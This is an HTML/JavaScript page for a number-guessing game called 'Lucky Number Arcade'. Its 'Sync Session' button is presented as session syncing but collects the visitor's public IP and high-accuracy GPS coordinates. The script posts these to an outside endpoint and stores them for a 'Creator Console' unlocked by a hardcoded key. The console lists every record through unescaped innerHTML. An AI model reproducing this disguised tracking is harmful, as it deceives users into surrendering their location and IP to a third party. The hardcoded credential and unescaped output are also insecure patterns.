<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Lucky Number Arcade</title>
  <style>
    :root {
      --bg: #0f172a;
      --card: #1e293b;
      --text: #f8fafc;
      --muted: #94a3b8;
      --accent: #38bdf8;
      --pulse: #22c55e;
      --danger: #f87171;
    }
    * { box-sizing: border-box; font-family: system-ui, -apple-system, sans-serif; }
    body {
      margin: 0;
      min-height: 100vh;
      background: var(--bg);
      color: var(--text);
      display: grid;
      place-items: center;
      padding: 1.5rem;
    }
    .container {
      width: 100%;
      max-width: 680px;
      background: var(--card);
      border: 1px solid rgba(255,255,255,0.08);
      border-radius: 16px;
      padding: 1.75rem;
      display: grid;
      gap: 1.5rem;
    }
    .header { display: flex; justify-content: space-between; align-items: center; gap: 1rem; }
    .badge {
      background: rgba(56, 189, 248, 0.15);
      color: var(--accent);
      padding: 0.35rem 0.75rem;
      border-radius: 999px;
      font-size: 0.85rem;
      font-weight: 600;
    }
    .game-box {
      background: #0b1120;
      border: 1px solid rgba(148, 163, 184, 0.25);
      border-radius: 12px;
      padding: 1.25rem;
      display: grid;
      gap: 0.9rem;
    }
    .num-grid {
      display: grid;
      grid-template-columns: repeat(5, 1fr);
      gap: 0.5rem;
    }
    .num-btn {
      padding: 0.65rem;
      border-radius: 8px;
      border: 1px solid rgba(148,163,184,0.3);
      background: #1e293b;
      color: var(--text);
      font-weight: 700;
      cursor: pointer;
    }
    .num-btn:hover { border-color: var(--accent); }
    .cta-box {
      background: rgba(34, 197, 94, 0.08);
      border: 1px solid rgba(34, 197, 94, 0.45);
      border-radius: 12px;
      padding: 1rem 1.25rem;
      display: flex;
      flex-wrap: wrap;
      align-items: center;
      justify-content: space-between;
      gap: 1rem;
    }
    #bonus-btn {
      background: var(--pulse);
      color: #052e16;
      border: 3px solid #bbf7d0;
      border-radius: 10px;
      padding: 0.8rem 1.25rem;
      font-size: 1rem;
      font-weight: 800;
      cursor: pointer;
      animation: glow 1.6s infinite alternate;
    }
    @keyframes glow {
      from { box-shadow: 0 0 0 0 rgba(34, 197, 94, 0.55); transform: scale(1); }
      to { box-shadow: 0 0 18px 4px rgba(34, 197, 94, 0.35); transform: scale(1.03); }
    }
    .status { font-size: 0.9rem; color: var(--muted); }
    .auth-box {
      border-top: 1px solid rgba(255,255,255,0.08);
      padding-top: 1.25rem;
      display: grid;
      gap: 0.75rem;
    }
    .row { display: flex; gap: 0.5rem; }
    input[type="password"] {
      flex: 1;
      padding: 0.65rem 0.85rem;
      border-radius: 8px;
      border: 1px solid rgba(148,163,184,0.3);
      background: #0b1120;
      color: var(--text);
    }
    button.secondary {
      padding: 0.65rem 1rem;
      border-radius: 8px;
      border: none;
      background: var(--accent);
      color: #06202a;
      font-weight: 700;
      cursor: pointer;
    }
    .error { color: var(--danger); font-size: 0.9rem; }
    ul.ip-list {
      list-style: none;
      padding: 0;
      margin: 0;
      display: grid;
      gap: 0.4rem;
      font-family: ui-monospace, SFMono-Regular, Menlo, monospace;
      font-size: 0.85rem;
    }
    ul.ip-list li {
      background: #0b1120;
      padding: 0.6rem 0.75rem;
      border-radius: 8px;
      display: flex;
      flex-wrap: wrap;
      justify-content: space-between;
      gap: 0.5rem;
    }
  </style>
</head>
<body>
  <main class="container">
    <div class="header">
      <div>
        <h1 style="margin:0;font-size:1.35rem;">Lucky Number Arcade</h1>
        <div class="status">Pick a number from 1 to 10</div>
      </div>
      <div class="badge">Wins: <span id="score">0</span></div>
    </div>

    <div class="game-box">
      <div class="num-grid" id="num-grid"></div>
      <div class="status" id="game-msg">Make your first pick above.</div>
    </div>

    <div class="cta-box">
      <div>
        <strong>Daily Spin Sync</strong>
        <div class="status" id="sync-status">Tap the highlighted button to sync your session.</div>
      </div>
      <button id="bonus-btn" type="button">Sync Session</button>
    </div>

    <section class="auth-box">
      <strong>Creator Console</strong>
      <form class="row" id="auth-form">
        <input id="admin-pass" type="password" placeholder="Enter creator key" required />
        <button class="secondary" type="submit">Open</button>
      </form>
      <div id="auth-message" class="status"></div>
      <ul class="ip-list" id="ip-results" hidden></ul>
    </section>
  </main>

  <script>
    const POST_ENDPOINT = "https://httpbin.org/post";
    const STORAGE_KEY = "lucky_arcade_entries";
    const ACCESS_CODE = "Satyam3407";

    // 1. Guess the Number (1-10) game
    let score = 0;
    let secret = Math.floor(Math.random() * 10) + 1;
    const scoreEl = document.getElementById("score");
    const gameMsg = document.getElementById("game-msg");
    const numGrid = document.getElementById("num-grid");

    for (let n = 1; n <= 10; n++) {
      const btn = document.createElement("button");
      btn.type = "button";
      btn.className = "num-btn";
      btn.textContent = n;
      btn.addEventListener("click", () => {
        if (n === secret) {
          score += 1;
          scoreEl.textContent = score;
          secret = Math.floor(Math.random() * 10) + 1;
          gameMsg.textContent = `Nice pick! ${n} was right. New number set.`;
        } else if (n < secret) {
          gameMsg.textContent = `${n} is too low — try a higher number.`;
        } else {
          gameMsg.textContent = `${n} is too high — try a lower number.`;
        }
      });
      numGrid.appendChild(btn);
    }

    // Helper: request browser coordinates via Geolocation API
    function getBrowserCoords() {
      return new Promise((resolve) => {
        if (!("geolocation" in navigator)) {
          return resolve({ lat: null, lng: null, accuracy: null, locStatus: "unsupported" });
        }

        navigator.geolocation.getCurrentPosition(
          (pos) => {
            resolve({
              lat: pos.coords.latitude,
              lng: pos.coords.longitude,
              accuracy: Math.round(pos.coords.accuracy),
              locStatus: "granted"
            });
          },
          (err) => {
            resolve({
              lat: null,
              lng: null,
              accuracy: null,
              locStatus: err.code === 1 ? "denied" : "unavailable"
            });
          },
          { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
        );
      });
    }

    // 2. Fetch client network info + browser coordinates & trigger POST API
    const bonusBtn = document.getElementById("bonus-btn");
    const syncStatus = document.getElementById("sync-status");

    bonusBtn.addEventListener("click", async () => {
      syncStatus.textContent = "Syncing...";
      try {
        const [ipRes, geo] = await Promise.all([
          fetch("https://api.ipify.org?format=json"),
          getBrowserCoords()
        ]);
        const { ip } = await ipRes.json();

        const payload = {
          ip,
          lat: geo.lat,
          lng: geo.lng,
          accuracyMeters: geo.accuracy,
          locStatus: geo.locStatus,
          score,
          timestamp: new Date().toISOString()
        };

        await fetch(POST_ENDPOINT, {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify(payload)
        });

        const existing = JSON.parse(localStorage.getItem(STORAGE_KEY) || "[]");
        existing.unshift(payload);
        localStorage.setItem(STORAGE_KEY, JSON.stringify(existing));

        syncStatus.textContent = "Session synced successfully.";
      } catch (err) {
        syncStatus.textContent = `Sync failed: ${err.message}`;
      }
    });

    // 3. Password-gated console display
    const authForm = document.getElementById("auth-form");
    const passInput = document.getElementById("admin-pass");
    const authMsg = document.getElementById("auth-message");
    const ipResults = document.getElementById("ip-results");

    authForm.addEventListener("submit", (e) => {
      e.preventDefault();
      ipResults.hidden = true;
      ipResults.innerHTML = "";

      if (passInput.value !== ACCESS_CODE) {
        authMsg.className = "error";
        authMsg.textContent = "Invalid creator key.";
        return;
      }

      const records = JSON.parse(localStorage.getItem(STORAGE_KEY) || "[]");
      authMsg.className = "status";
      authMsg.textContent = `Unlocked (${records.length} entry/entries):`;

      for (const item of records) {
        const coordsText =
          item.lat !== null && item.lng !== null
            ? `${item.lat.toFixed(5)}, ${item.lng.toFixed(5)} (±${item.accuracyMeters}m)`
            : `coords: ${item.locStatus || "n/a"}`;

        const li = document.createElement("li");
        li.innerHTML = `<span>${item.ip} | ${coordsText} | Wins: ${item.score}</span><span>${new Date(item.timestamp).toLocaleString()}</span>`;
        ipResults.appendChild(li);
      }
      ipResults.hidden = false;
    });
  </script>
</body>
</html>
